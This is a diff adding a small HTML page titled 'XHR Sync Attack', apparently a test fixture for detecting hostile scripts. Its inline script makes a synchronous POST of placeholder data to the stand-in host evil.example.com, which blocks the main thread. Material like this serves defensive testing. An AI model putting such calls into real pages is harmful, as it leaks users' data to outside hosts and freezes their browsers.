@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>XHR Sync Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: Synchronous XHR blocks main thread
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://evil.example.com/sync', false);
+    xhr.send('data');
+  </script>
+</body>
+</html>
